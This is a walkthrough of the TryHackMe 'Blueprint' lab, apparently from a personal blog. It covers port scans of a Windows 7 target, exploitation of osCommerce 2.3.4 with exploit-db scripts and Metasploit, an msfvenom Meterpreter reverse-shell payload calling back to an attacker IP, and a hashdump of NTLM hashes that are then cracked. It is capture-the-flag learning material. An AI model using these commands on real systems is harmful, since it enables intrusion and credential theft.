---
title: Walkthrough - Blueprint
published: true
---

Security, Windows. Hack into this Windows machine and escalaye privileges to admin.

![0xskar](/assets/blueprint01.png)

[https://tryhackme.com/room/blueprint](https://tryhackme.com/room/blueprint)

* * *

## Notes

- ``sudo nmap -Pn -sS -p- -T4 10.10.226.32 -vvv``

```
PORT      STATE SERVICE      REASON
80/tcp    open  http         syn-ack ttl 125
135/tcp   open  msrpc        syn-ack ttl 125
139/tcp   open  netbios-ssn  syn-ack ttl 125
443/tcp   open  https        syn-ack ttl 125
445/tcp   open  microsoft-ds syn-ack ttl 125
3306/tcp  open  mysql        syn-ack ttl 125
8080/tcp  open  http-proxy   syn-ack ttl 125
49152/tcp open  unknown      syn-ack ttl 125
49153/tcp open  unknown      syn-ack ttl 125
49154/tcp open  unknown      syn-ack ttl 125
49158/tcp open  unknown      syn-ack ttl 125
49159/tcp open  unknown      syn-ack ttl 125
49160/tcp open  unknown      syn-ack ttl 125
```

- ``sudo nmap -sV -sT -sC -p80,135,139,443,445,3306,8080,49152,49153,49154,49158,49159,49160 10.10.226.32``

```
PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft IIS httpd 7.5
|_http-server-header: Microsoft-IIS/7.5
|_http-title: 404 - File or directory not found.
| http-methods: 
|_  Potentially risky methods: TRACE
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
443/tcp   open  ssl/http     Apache httpd 2.4.23 (OpenSSL/1.0.2h PHP/5.6.28)
|_http-title: Bad request!
| tls-alpn: 
|_  http/1.1
|_http-server-header: Apache/2.4.23 (Win32) OpenSSL/1.0.2h PHP/5.6.28
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
445/tcp   open  microsoft-ds Windows 7 Home Basic 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3306/tcp  open  mysql        MariaDB (unauthorized)
8080/tcp  open  http         Apache httpd 2.4.23 (OpenSSL/1.0.2h PHP/5.6.28)
|_http-server-header: Apache/2.4.23 (Win32) OpenSSL/1.0.2h PHP/5.6.28
|_http-title: Index of /
| http-methods: 
|_  Potentially risky methods: TRACE
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49158/tcp open  msrpc        Microsoft Windows RPC
49159/tcp open  msrpc        Microsoft Windows RPC
49160/tcp open  msrpc        Microsoft Windows RPC
Service Info: Hosts: www.example.com, BLUEPRINT, localhost; OS: Windows; CPE: cpe:/o:microsoft:windows
```

Port 8080 has an osCommerce site version 2.3.4. searchsploit oscommerce 2.3.4. ``locate 50128`` and lets try to run this exploit. 

- ``python3 ~/exploitdb/exploits/php/webapps/50128.py http://10.10.22.83:8080/oscommerce-2.3.4/catalog``

![0xskar](/assets/blueprint02.png)

- ``whoami /priv`` can see SeImpersonatePrivilege is Enabled.

- ``wmic useraccount get name`` give us Administrator, Guest, and ``Lab`` users.

- unfortuneatly this shell doesnt let us too much so lets look at 43191.py which is an Arbitraty File Upload. ``locate 43191.py`` and should let us upload a windows php revshell.

Using ``multi/http/oscommerce_installer_unauth_code_exec`` in ``msfconsole`` we can upload and execute a revshell ``msfvenom -p windows/meterpreter/reverse_tcp  LHOST=10.2.127.225 LPORT=5555 -f exe > winshell.exe``

Start up a second msfvenom console and start multi handler listener to get a stable shell. ``hashdump`` to dump user creds.

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:549a1bcb88e35dc18c7a0b0168631411:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Lab:1000:aad3b435b51404eeaad3b435b51404ee:30e87bf999828446a1c1209ddde4c450:::
```

* * * 

## "Lab" user NTML hash decrypted

- crackstation.net

* * * 

## root.txt

![0xskar](/assets/blueprint03.png)

* * * 

